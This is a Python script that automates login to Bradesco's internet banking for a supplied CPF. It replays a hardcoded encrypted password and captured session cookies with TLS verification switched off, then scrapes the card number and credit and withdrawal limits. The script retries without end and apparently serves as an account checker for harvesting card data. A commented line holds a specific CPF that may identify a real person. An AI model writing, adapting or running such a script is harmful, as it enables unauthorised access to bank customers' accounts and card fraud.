import requests
from requests_toolbelt import MultipartEncoder

from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def pegarItem(data, esquerda, direita):
    return data.partition(esquerda)[-1].partition(direita)[0]

async def run(cpf: str) -> str:
    try:

        url = 'https://www.ib12.bradesco.com.br/ibpfnaocorrentistalogin/identificacao.jsf'

        headers = {
            'Host': 'www.ib12.bradesco.com.br',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
            'Referer': 'https://www.bradescard.com.br/bradescard/html/cartoes.html',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.bradescard.com.br',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i',
            'Connection': 'close',
        }

        data = {
            'CPF': f'{cpf[0:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:11]}',
            'IDENT': f'{cpf}',
            'ORIGEM': '64',
        }

        response = requests.post(
            url=url,
            headers=headers,
            data=data,
            verify=False,
            timeout=50,
            allow_redirects=False
        )

        CTLCK = pegarItem(response.headers.get('Set-Cookie'), 'CTLCK',';')
        JSESSIONID = pegarItem(response.headers.get('Set-Cookie'), ', JSESSIONID=',';')

        # print(CTLCK)
        # print(JSESSIONID)

        url = 'https://www.ib12.bradesco.com.br/ibpfnaocorrentistalogin/login.jsf'

        cookies = {
            'JSESSIONID': f'{JSESSIONID}',
            f'CTLCK{CTLCK.split("=")[0]}': f'{CTLCK.split("=")[1]}',
        }

        headers = {
            'Host': 'www.ib12.bradesco.com.br',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
            'Referer': 'https://www.ib12.bradesco.com.br/ibpfnaocorrentistalogin/identificacao.jsf',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'iframe',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=4',
            'Connection': 'close',
        }

        response = requests.get(
            url = url,
            cookies=cookies,
            headers=headers,
            verify=False,
            timeout=50,
            allow_redirects=False
        )

        CTL = pegarItem(response.text, "_CTL='","'")

        #print(CTL)

        url = f"https://www.ib12.bradesco.com.br/ibpfnaocorrentistalogin/login.jsf?javax.portlet.faces.DirectLink=true"

        cookies = {
            'JSESSIONID': f'{JSESSIONID}',
            f'CTLCK{CTLCK.split("=")[0]}': f'{CTLCK.split("=")[1]}',
        }

        headers = {
            'Host': 'www.ib12.bradesco.com.br',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
            'Accept': '*/*',
            'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.ib12.bradesco.com.br',
            'Referer': 'https://www.ib12.bradesco.com.br/ibpfnaocorrentistalogin/login.jsf',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
            'Connection': 'close',
        }

        data = f'AJAXREQUEST=_viewRoot&frmTecladoVirtual%3AsenhaCript=f8LC19P%2BpS%2Bhpei%2Fi1%2Bien1xiaGe3aAWYYWzQXKHsyN37RM5NFvgqOOMYvVfNjrdOppQ7prGtNsQhY%2F3JmgD%2F3mZDXjR9yLxBVq34uJw6EuX4ygK8KgkIDKG7Nkn%2BSqh6%2FKqGeghAA0NSrii%2BZ65Fx6nQns3WfUeBvzg1kf5rcA%3D&frmTecladoVirtual%3Asenha=&frmTecladoVirtual_SUBMIT=1&autoScroll=&frmTecladoVirtual%3A_link_hidden_=&frmTecladoVirtual%3AbotaoAvancar=frmTecladoVirtual%3AbotaoAvancar&'

        response = requests.post(
            url= url,
            cookies=cookies,
            headers=headers,
            data=data,
            verify=False,
            timeout=50,
            allow_redirects=False
        )

        url = 'https://www.ib12.bradesco.com.br/ibpfnaocorrentistalogin/autenticacao.jsf'

        cookies = {
            'JSESSIONID': f'{JSESSIONID}',
            f'CTLCK{CTLCK.split("=")[0]}': f'{CTLCK.split("=")[1]}',
        }

        headers = {
            'Host': 'www.ib12.bradesco.com.br',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
            'Accept': '*/*',
            'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.ib12.bradesco.com.br',
            'Referer': 'https://www.ib12.bradesco.com.br/ibpfnaocorrentistalogin/login.jsf',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Connection': 'close',
        }

        response = requests.post(
            url=url,
            cookies=cookies,
            headers=headers,
            verify=False,
            timeout=50,
            allow_redirects=False
        )

        url = 'https://www.ib12.bradesco.com.br/ibpfnaocorrentistatelainicial/home.jsf'

        cookies = {
            'JSESSIONID': f'{JSESSIONID}',
            f'CTLCK{CTLCK.split("=")[0]}': f'{CTLCK.split("=")[1]}',
        }

        infos = MultipartEncoder(fields={
            'CTL': CTL,
        })

        headers = {
            'Host': 'www.ib12.bradesco.com.br',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
            'Content-Type': infos.content_type,
            'Origin': 'https://www.ib12.bradesco.com.br',
            'Referer': 'https://www.ib12.bradesco.com.br/ibpfnaocorrentistalogin/identificacao.jsf',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i',
            'Connection': 'close',
        }

        response = requests.post(
            url=url,
            cookies=cookies,
            headers=headers,
            data=infos,
            verify=False,
            timeout=50,
            allow_redirects=False
        )

        url = f'https://www.ib12.bradesco.com.br/cartoesbradesco/cartoesHome.jsf?CTL={CTL}'

        cookies = {
            'JSESSIONID': f'{JSESSIONID}',
            f'CTLCK{CTLCK.split("=")[0]}': f'{CTLCK.split("=")[1]}',
        }

        headers = {
            'Host': 'www.ib12.bradesco.com.br',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
            'Referer': 'https://www.ib12.bradesco.com.br/ibpfnaocorrentistatelainicial/home.jsf',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'iframe',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=4',
            'Connection': 'close',
        }

        response = requests.get(
            url=url,
            cookies=cookies,
            headers=headers,
            verify=False,
            timeout=50,
            allow_redirects=False
        )

        JSESSIONID_Menu_Cartoes = pegarItem(response.headers.get('Set-Cookie'), 'JSESSIONID_Menu_Cartoes=',';')

        url='https://www.ib12.bradesco.com.br/cartoesbradesco/cartoesHome.jsf'

        cookies = {
            'JSESSIONID': f'{JSESSIONID}',
            f'CTLCK{CTLCK.split("=")[0]}': f'{CTLCK.split("=")[1]}',
            'JSESSIONID_Menu_Cartoes': f'{JSESSIONID_Menu_Cartoes}'
        }

        headers = {
            'Host': 'www.ib12.bradesco.com.br',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.ib12.bradesco.com.br',
            'Referer': f'https://www.ib12.bradesco.com.br/cartoesbradesco/cartoesHome.jsf?CTL={CTL}',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'iframe',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=4',
            'Connection': 'close',
        }

        body = f"autoScroll=0%2C0&linkDummyForm%3A_link_hidden_=mapaCompletoDataTable_3%3A_id177_0%3A_id179&requestedAction=%23%7BconsultaLimiteCompraSaqueBean.iniciarManagedBean%7D&CTL={CTL}&backMapa=C01"

        response = requests.post(
            url=url,
            cookies=cookies,
            headers=headers,
            data=body,
            verify=False,
            timeout=50,
            allow_redirects=False
        )

        #print(response.text)
        
        msg = {
            "card": pegarItem(response.text,'id="numCartaoLimiteAtribuido[0]" class="numeroListaCartao">','</'),
            "Saldos": {
                "totalCreditoSaque": pegarItem(response.text, 'class="totalCreditoSaque">','</'),
                "totalDisponivelSaque": pegarItem(response.text, 'id="totalDisponivelSaque[0]">','</'),
                "totalCreditoCompra": pegarItem(response.text, 'class="totalCreditoCompra">','</'),
                "totalDisponivelCompra": pegarItem(response.text, 'class="totalDisponivelCompra">','</'),
            }
            
        }

        

        print(msg)

        return msg

    except:
        print(f"retestando: {cpf}")

        #print(err)
        return await run(cpf)

    
# cpf = "34199813845"
# run(cpf)